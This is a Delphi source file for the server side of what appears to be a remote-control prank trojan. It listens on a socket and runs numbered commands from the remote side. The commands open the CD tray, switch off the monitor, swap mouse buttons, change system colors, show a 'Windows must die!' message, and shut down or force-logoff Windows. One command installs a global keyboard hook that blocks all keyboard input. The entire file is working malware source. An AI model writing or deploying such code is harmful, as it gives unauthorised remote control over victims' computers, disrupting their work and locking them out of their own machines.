unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes,
  Graphics, Controls, Forms, WinProcs, registry,
  Dialogs, MMSystem, ScktComp, StdCtrls;

const
SysColorArray: array [0..13] of Integer = (COLOR_ACTIVEBORDER, COLOR_ACTIVECAPTION, COLOR_APPWORKSPACE, COLOR_BACKGROUND, COLOR_BTNFACE, COLOR_BTNTEXT, COLOR_CAPTIONTEXT, COLOR_INACTIVEBORDER, COLOR_INFOTEXT, COLOR_MENU, COLOR_MENUTEXT, COLOR_WINDOW, COLOR_WINDOWFRAME, COLOR_WINDOWTEXT);
ColorArray: array [0..12] of Integer = (16776960, 0, 16711680, 65535, 16711935, 32768, 8388608, 255, 12632256, 16777215, 15780518, 128, 32896);
//Цвета хранятся в модуле Graphics.pas

type
  TForm1 = class(TForm)
    ServerSocket1: TServerSocket;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  KS: TKeyboardState;
  Dummy: integer=0;
  OldKbHook: HHook=0;

implementation

{$R *.dfm}

function KbHook( code: Integer; wparam: Word; lparam: LongInt ): LongInt; stdcall;
begin
 if code<0 then Result:=CallNextHookEx( oldKbHook, code, wparam, lparam )
 else Result:=1;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 ServerSocket1.Active:=true;
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
 ServerSocket1.Active:=false;
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
 Socket: TCustomWinSocket);
var i:string;
begin
 i:=Socket.ReceiveText;
  if i='1' then
      mciSendString('Set cdaudio door open wait', nil, 0, handle)
 else
   if i='2' then
      mciSendString('Set cdaudio door closed wait', nil, 0, handle)
 else
   if i='3' then
      SendMessage(Application.Handle,wm_SysCommand,SC_MonitorPower, 2)
 else
   if i='4' then begin
      GetKeyboardState(KS);
      KS[020] := KS[020] xor 1;
      KS[144] := KS[144] xor 1;
      KS[145] := KS[145] xor 1;
      SetKeyboardstate(KS); end
 else
   if i='5' then
      SwapMouseButton(true)
 else
   if i='6' then
      Swapmousebutton(false)
 else
   if i='7' then
      SetSysColors(1, SysColorArray[random(13)], ColorArray[random(12)])
 else
   if i='8' then
      MessageDlg('Windows must die!',mtError, [mbOk],0)
 else
   if i='9' then
      ExitWindowsEx(EWX_SHUTDOWN,0)
 else
   if i='10' then
      ExitWindowsEx(EWX_FORCE,0)
 else
   if i='11' then
      ExitWindows(EW_RestartWindows, 0)
 else
   if i='12' then begin
     SystemParametersInfo( SPI_SETFASTTASKSWITCH, 1, @Dummy, 0);
     SystemParametersInfo( SPI_SCREENSAVERRUNNING, 1, @Dummy, 0);
     OldKbHook := SetWindowsHookEx( WH_KEYBOARD, @KbHook, HInstance, 0 );
   end;
end;

end.

